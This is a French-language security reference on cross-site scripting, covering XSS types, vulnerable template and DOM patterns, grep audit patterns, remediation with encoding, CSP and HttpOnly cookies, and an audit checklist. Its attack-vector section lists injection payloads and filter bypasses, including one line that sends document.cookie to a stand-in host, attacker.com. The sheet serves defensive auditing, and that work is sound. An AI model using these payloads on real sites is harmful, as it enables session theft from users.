# Cross-Site Scripting (XSS)

## Définition

Injection de scripts malveillants (JavaScript) dans des pages web, exécutés dans le navigateur de la victime.

## Sévérité

🟠 **HAUTE** (XSS Stored) - Vol de sessions, phishing, malware
🟡 **MOYENNE** (XSS Reflected) - Vol de sessions, redirection malveillante

## Types de XSS

### 1. Stored XSS (Persistant)
- Script stocké dans la base de données
- Exécuté à chaque affichage
- Plus dangereux (touche tous les utilisateurs)

### 2. Reflected XSS (Non-persistant)
- Script dans l'URL ou paramètre
- Exécuté immédiatement
- Nécessite que la victime clique sur lien malveillant

### 3. DOM-based XSS
- Manipulation du DOM côté client
- JavaScript vulnérable côté navigateur
- Pas de passage par le serveur

### 4. Blind XSS
- Stored XSS dans zone admin/backoffice
- Exécuté quand admin consulte
- Difficile à détecter

## Patterns Vulnérables à Détecter

### Backend - Injection dans Templates

```
Patterns dangereux :
- <%= userInput %>  (pas d'échappement)
- {{ userInput | safe }}  (désactive l'échappement)
- res.send("<div>" + userInput + "</div>")
- template.innerHTML = userInput
- dangerouslySetInnerHTML={{ __html: userInput }}
```

### Frontend - DOM Manipulation

```
- element.innerHTML = userInput
- element.outerHTML = userInput
- document.write(userInput)
- eval(userInput)
- setTimeout(userInput, 1000)
- setInterval(userInput)
- Function(userInput)
- location = userInput
- window.location = userInput
```

### URL/Attribute Injection

```
- href="javascript:" + userInput
- src="data:text/html," + userInput
- onclick="alert('" + userInput + "')"
- style="background: " + userInput
```

## Vecteurs d'Attaque

### Basic Script Injection
```
<script>alert('XSS')</script>
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

### Event Handlers
```
<img src=x onerror="alert('XSS')">
<body onload="alert('XSS')">
<svg onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>
```

### JavaScript Pseudo-Protocol
```
<a href="javascript:alert('XSS')">Click</a>
<iframe src="javascript:alert('XSS')">
```

### Data URIs
```
<object data="data:text/html,<script>alert('XSS')</script>">
<embed src="data:text/html,<script>alert('XSS')</script>">
```

### CSS Injection
```
<style>body{background:url('javascript:alert("XSS")')}</style>
<link rel="stylesheet" href="data:,*{x:expression(alert('XSS'))}">
```

### HTML Entities Bypass
```
&lt;script&gt;alert('XSS')&lt;/script&gt;
(si double décodage)
```

### Filter Bypass
```
<scr<script>ipt>alert('XSS')</script>
<script>alert(String.fromCharCode(88,83,83))</script>
<sCrIpT>alert('XSS')</sCrIpT>
```

## Localisation dans le Code

### À Chercher Backend

#### Templates/Views
- Variables non échappées
- Filtres "safe" ou "raw"
- Concaténation HTML manuelle

#### API Responses
- HTML dans JSON
- Pas de Content-Type correct
- Reflection d'inputs

#### Error Messages
- Stack traces avec input utilisateur
- Messages d'erreur non sanitizés

### À Chercher Frontend

#### DOM Manipulation
- innerHTML, outerHTML
- document.write
- eval, setTimeout avec strings

#### Attributes Dynamiques
- href, src dynamiques
- Event handlers dynamiques
- style attributes

#### Third-party Libraries
- jQuery.html()
- Vue v-html
- React dangerouslySetInnerHTML
- Angular [innerHTML]

### Patterns à Grep

```
Backend :
- "innerHTML.*="
- "\.html\(.*\)"
- "dangerouslySetInnerHTML"
- "<%=.*%>"
- "\{\{.*\|.*safe.*\}\}"
- "res\.send.*\+.*req\."

Frontend :
- "innerHTML.*req\."
- "innerHTML.*params"
- "document\.write"
- "eval\("
- "setTimeout\(.*\+"
- "href.*=.*user"
```

## Impact

### Vol de Sessions
- Extraction de cookies (document.cookie)
- Envoi à un serveur attacker
- Session hijacking

### Phishing
- Injection de formulaires de login
- Redirection vers sites malveillants
- Spoofing de l'interface

### Defacement
- Modification du contenu de la page
- Affichage de contenu malveillant

### Keylogging
- Capture des frappes clavier
- Vol de credentials

### Malware Distribution
- Téléchargement de malware
- Drive-by download
- Exploitation de vulnérabilités navigateur

### Propagation
- XSS worm (self-propagating)
- Infection d'autres utilisateurs

## Remédiation

### 1. Output Encoding (Essentiel)

**Context-Aware Encoding**

**HTML Context**
```
✅ CORRECT :
Échapper : < > " ' &
< → &lt;
> → &gt;
" → &quot;
' → &#x27;
& → &amp;
```

**JavaScript Context**
```
✅ CORRECT :
Échapper : \ " ' < > /
Utiliser JSON.stringify() pour objets
```

**URL Context**
```
✅ CORRECT :
encodeURIComponent(userInput)
```

**CSS Context**
```
✅ CORRECT :
Échapper caractères spéciaux CSS
Éviter user input dans CSS si possible
```

### 2. Template Engines avec Auto-Escaping

**Activation par Défaut**
```
✅ CORRECT :
- Handlebars : {{ variable }}  (échappé automatiquement)
- Jinja2 : {{ variable }}  (échappé par défaut)
- React : {variable}  (échappé automatiquement)
- Vue : {{ variable }}  (échappé par défaut)
```

**Éviter**
```
❌ BAD :
- {{{ variable }}}  (Handlebars non échappé)
- {{ variable | safe }}  (Jinja2 désactive l'échappement)
- dangerouslySetInnerHTML  (React)
- v-html  (Vue)
```

### 3. Content Security Policy (CSP)

**Headers HTTP**
```
✅ CORRECT :
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  object-src 'none';
  base-uri 'self';
```

**Nonce pour Scripts Inline**
```
<script nonce="random-value">
  // code
</script>
```

**Avantages**
- Bloque inline scripts par défaut
- Whitelist des sources autorisées
- Protection en profondeur

### 4. Input Validation

**Validation Stricte**
- Whitelist de caractères autorisés
- Format attendu (regex)
- Longueur maximale

**Attention**
- Validation seule insuffisante
- Toujours encoder en sortie
- Defense in depth

### 5. HTTPOnly Cookies

**Protection des Cookies**
```
✅ CORRECT :
Set-Cookie: sessionid=...; HttpOnly; Secure; SameSite=Strict
```

**Avantage**
- JavaScript ne peut pas lire le cookie
- Limite l'impact d'un XSS

### 6. Sanitization Libraries

**Pour HTML Riche**
```
✅ CORRECT :
- DOMPurify (JavaScript)
- Bleach (Python)
- HtmlSanitizer (C#)

Configuration stricte :
- Whitelist de tags autorisés
- Whitelist d'attributs
- Suppression des event handlers
```

### 7. Avoid Dangerous Functions

**Ne Pas Utiliser**
- innerHTML (utiliser textContent)
- outerHTML
- document.write
- eval()
- setTimeout/setInterval avec strings
- Function()

**Alternatives Sûres**
```
✅ CORRECT :
// Au lieu de innerHTML
element.textContent = userInput

// Au lieu de document.write
element.appendChild(document.createTextNode(text))
```

## Checklist d'Audit

### Recherche de Vulnérabilités
- [ ] User input affiché sans échappement ?
- [ ] innerHTML, outerHTML utilisés ?
- [ ] Template filters "safe" ou "raw" ?
- [ ] Concaténation HTML manuelle ?
- [ ] document.write avec user input ?
- [ ] eval, setTimeout avec user input ?
- [ ] href, src dynamiques non validés ?

### Validation des Correctifs
- [ ] Output encoding en place (context-aware) ?
- [ ] Auto-escaping activé dans templates ?
- [ ] CSP headers configurés ?
- [ ] HTTPOnly sur cookies de session ?
- [ ] Sanitization library si HTML riche nécessaire ?
- [ ] textContent plutôt que innerHTML ?

### Tests de Vulnérabilité
- [ ] Tester <script>alert('XSS')</script> ?
- [ ] Tester <img src=x onerror=alert('XSS')> ?
- [ ] Tester javascript:alert('XSS') ?
- [ ] Tester event handlers (onload, onerror) ?
- [ ] Tester dans différents contextes (HTML, JS, URL) ?

## Contextes d'Encoding

### HTML Body
```
< > & " ' → Entités HTML
```

### HTML Attribute
```
< > & " ' → Entités HTML
Quotes obligatoires autour de l'attribut
```

### JavaScript
```
\ " ' / < > → Échappement backslash
Ou JSON.stringify()
```

### URL
```
encodeURIComponent()
```

### CSS
```
Échapper caractères spéciaux CSS
Éviter si possible
```

## Exemples Sécurisés

### Template Sécurisé
```
✅ CORRECT (Handlebars) :
<div>{{ username }}</div>  <!-- Échappé automatiquement -->

✅ CORRECT (React) :
<div>{username}</div>  {/* Échappé automatiquement */}
```

### DOM Manipulation Sécurisée
```
❌ BAD :
element.innerHTML = userInput

✅ GOOD :
element.textContent = userInput
// Ou
const text = document.createTextNode(userInput)
element.appendChild(text)
```

### API Response Sécurisée
```
✅ CORRECT :
res.json({ message: userInput })  // JSON safe
// Pas de HTML dans JSON
```

## Références

- **OWASP** : Cross-Site Scripting (XSS)
- **CWE-79** : Improper Neutralization of Input During Web Page Generation
- **OWASP XSS Prevention Cheat Sheet**
- **Content Security Policy (CSP)**
